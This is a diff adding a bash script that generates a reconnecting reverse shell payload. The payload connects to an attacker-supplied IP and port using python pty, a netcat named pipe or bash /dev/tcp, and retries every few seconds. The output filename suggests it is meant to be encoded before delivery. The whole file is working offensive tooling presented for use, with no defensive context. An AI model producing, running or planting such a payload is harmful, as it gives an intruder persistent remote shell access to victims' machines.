@@ -1,0 +1,37 @@
+#!/usr/bin/env bash
+# Usage: revshell [outfile] H=<ip> P=<port>
+# Writes a reconnecting reverse shell script and prints the output path.
+
+OUTFILE="to-be-encoded.sh"
+H="" P=""
+for arg in "$@"; do
+  case "$arg" in
+    H=*) H="${arg#H=}" ;;
+    P=*) P="${arg#P=}" ;;
+    *)   OUTFILE="$arg" ;;
+  esac
+done
+
+[[ -n "$H" ]] || { echo "error: H=<ip> required" >&2; exit 1; }
+[[ -n "$P" ]] || { echo "error: P=<port> required" >&2; exit 1; }
+
+cat > "$OUTFILE" <<EOF
+H=$H
+P=$P
+C="command -v"
+PY=\$(\$C python3 || \$C python)
+NC=\$(\$C nc || \$C ncat)
+SH=\$(\$C bash || \$C sh)
+while true; do
+  if [ -n "\$PY" ]; then
+    \$PY -c "import socket,os,pty;s=socket.socket();s.connect(('\$H',\$P));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/bash')" 2>/dev/null
+  elif [ -n "\$NC" ]; then
+    F=/tmp/f\$\$; mkfifo \$F; cat \$F|\$SH -i 2>&1|\$NC \$H \$P >\$F; rm \$F
+  else
+    bash -i >& /dev/tcp/\$H/\$P 0>&1
+  fi
+  sleep 3
+done
+EOF
+chmod +x "$OUTFILE"
+echo "$OUTFILE"
